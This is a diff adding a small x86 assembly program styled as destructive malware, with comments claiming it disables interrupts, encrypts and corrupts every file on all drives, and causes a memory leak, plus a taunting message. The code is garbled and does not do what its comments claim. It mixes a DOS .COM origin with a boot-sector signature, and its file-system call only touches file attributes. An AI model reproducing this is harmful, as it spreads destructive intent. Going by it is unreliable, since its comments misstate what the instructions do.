@@ -1,0 +1,34 @@
+; E
+
+ORG 100h
+
+start:
+    ; Disable all system interrupts
+    xor ax, ax
+    cli
+    mov ds, ax
+    mov es, ax
+    mov fs, ax
+    mov gs, ax
+    mov ss, ax
+
+    ; Encrypt and corrupt all files on all drives
+    mov ah, 43h
+    mov al, 1
+    xor dx, dx
+    int 21h
+
+    ; odjesfrej
+    mov ah, 9
+    mov dx, offset message
+    int 21h
+
+    ; Trigger a system-wide memory leak
+    mov ax, 0F00Ah
+    mov bx, 0
+    int 2Fh
+
+message db "Why did you run this?", 0
+
+times 510-($-$$) db 0
+dw 0AA55h
